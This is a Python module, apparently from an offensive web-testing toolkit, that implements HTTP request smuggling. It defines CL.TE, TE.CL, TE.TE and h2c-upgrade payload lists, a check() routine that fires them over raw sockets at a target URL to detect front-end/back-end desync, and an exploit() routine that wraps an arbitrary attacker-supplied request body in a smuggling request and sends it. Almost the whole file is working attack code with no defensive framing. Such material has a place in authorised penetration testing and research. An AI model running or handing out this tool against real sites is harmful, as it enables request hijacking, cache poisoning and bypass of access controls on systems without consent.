import socket
import time
from typing import Dict, List, Optional

import requests

from tools.log_utils import get_logger

logger = get_logger("smuggler")

CL_TE_PAYLOADS = [
    (
        "cl_te_basic",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
    ),
    (
        "cl_te_garbage",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled?t={ts} HTTP/1.1\r\nX:"
    ),
]

TE_CL_PAYLOADS = [
    (
        "te_cl_basic",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n"
    ),
    (
        "te_cl_x",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
    ),
]

TE_TE_PAYLOADS = [
    (
        "te_te_case",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
    ),
    (
        "te_te_spaces",
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding:\t chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
    ),
    (
        "te_te_obfuscated",
        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
    ),
]

H2C_UPGRADE_PAYLOADS = [
    (
        "h2c_upgrade",
        "GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n"
    ),
]

SMUGGLING_MARKER = "/404smuggled"


def _extract_host_port(url: str) -> tuple:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port


def _raw_http_request(host: str, port: int, raw_request: str, timeout: float = 10.0) -> Optional[str]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(raw_request.encode())
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        return response.decode("utf-8", errors="replace")
    except Exception as e:
        logger.debug("raw request to %s:%d failed: %s", host, port, e)
        return None


def _has_marker_in_response(responses: List[str]) -> bool:
    for resp in responses:
        if resp and SMUGGLING_MARKER in resp:
            return True
    return False


def _detect_via_delay(host: str, port: int, raw_request: str, timeout: float = 10.0) -> float:
    delays = []
    for _ in range(3):
        start = time.time()
        _raw_http_request(host, port, raw_request, timeout=timeout)
        elapsed = time.time() - start
        delays.append(elapsed)
    return sum(delays) / len(delays)


def _detect_cl_te(host: str, port: int, url: str, timeout: float) -> List[Dict]:
    results = []
    for name, tpl in CL_TE_PAYLOADS:
        marker_key = "ts"
        payload = tpl.format(host=host, ts=int(time.time()))
        raw = payload.encode()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(raw)
            time.sleep(0.5)
            sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
            time.sleep(0.5)
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()
            resp_text = response.decode("utf-8", errors="replace")
            if SMUGGLING_MARKER in resp_text:
                results.append({"type": "cl_te", "variant": name, "detected": True})
                logger.info("CL.TE smuggling detected via %s", name)
                return results
        except Exception as e:
            logger.debug("cl_te %s: %s", name, e)
    return results


def _detect_te_cl(host: str, port: int, timeout: float) -> List[Dict]:
    results = []
    for name, tpl in TE_CL_PAYLOADS:
        payload = tpl.format(host=host)
        normal_avg = _detect_via_delay(host, port, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host, timeout)
        smug_avg = _detect_via_delay(host, port, payload, timeout)
        if smug_avg > normal_avg * 2.5:
            results.append({"type": "te_cl", "variant": name, "detected": True, "delay": round(smug_avg - normal_avg, 2)})
            logger.info("TE.CL smuggling detected via %s (delay %.2fs)", name, smug_avg - normal_avg)
            return results
    return results


def _detect_te_te(host: str, port: int, timeout: float) -> List[Dict]:
    results = []
    for name, tpl in TE_TE_PAYLOADS:
        payload = tpl.format(host=host)
        responses = []
        for _ in range(3):
            resp = _raw_http_request(host, port, payload, timeout)
            if resp:
                responses.append(resp)
        if _has_marker_in_response(responses):
            results.append({"type": "te_te", "variant": name, "detected": True})
            logger.info("TE.TE smuggling detected via %s", name)
            return results
    return results


def _detect_h2c(host: str, port: int, timeout: float) -> List[Dict]:
    results = []
    for name, tpl in H2C_UPGRADE_PAYLOADS:
        payload = tpl.format(host=host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(payload.encode())
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()
            resp_text = response.decode("utf-8", errors="replace")
            if "101" in resp_text and "Switching Protocols" in resp_text:
                results.append({"type": "h2c_upgrade", "variant": name, "detected": True})
                logger.info("h2c upgrade detected")
                return results
        except Exception as e:
            logger.debug("h2c %s: %s", name, e)
    return results


def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    host, port = _extract_host_port(url)
    result = {
        "vulnerable": False,
        "url": url,
        "host": host,
        "port": port,
        "findings": [],
        "smuggling_type": None,
    }
    if port == 443:
        logger.info("HTTPS target, HTTP/2 via ALPN may prevent raw socket smuggling")
        try:
            r = sess or requests.Session()
            resp = r.get(url, timeout=timeout)
            if resp.status_code < 500:
                logger.info("Target speaks HTTP/1.1 over TLS, testing smuggling via HTTP/1.1 fallback")
        except Exception:
            pass
    findings = []
    findings.extend(_detect_cl_te(host, port, url, timeout))
    if not findings:
        findings.extend(_detect_te_cl(host, port, timeout))
    if not findings:
        findings.extend(_detect_te_te(host, port, timeout))
    if not findings:
        findings.extend(_detect_h2c(host, port, timeout))
    if findings:
        result["vulnerable"] = True
        result["findings"] = findings
        result["smuggling_type"] = findings[0]["type"]
    return result


def exploit(url: str, attack_type: str = "cl_te", attack_body: str = "",
            sess: Optional[requests.Session] = None, timeout: float = 10.0) -> Dict:
    host, port = _extract_host_port(url)
    result = {"success": False, "type": attack_type, "response": None}
    host_header = host.split(":")[0]
    if attack_type == "cl_te":
        smuggle_req = (
            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n{body}"
        ).format(host=host_header, cl=len(attack_body) + 2, body=attack_body)
    elif attack_type == "te_cl":
        smuggle_req = (
            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n\r\n{body_hex}\r\n{body}\r\n0\r\n\r\n"
        ).format(host=host_header, body_hex=hex(len(attack_body))[2:], body=attack_body)
    elif attack_type == "te_te":
        smuggle_req = (
            "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n"
            "Transfer-encoding: x\r\n\r\n0\r\n\r\n{body}"
        ).format(host=host_header, body=attack_body)
    else:
        return {"success": False, "error": "Unknown attack type: %s" % attack_type}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(smuggle_req.encode())
        time.sleep(0.3)
        sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host_header.encode())
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        resp_text = response.decode("utf-8", errors="replace")
        result["success"] = True
        result["response"] = resp_text[:2000]
    except Exception as e:
        result["error"] = str(e)
    return result
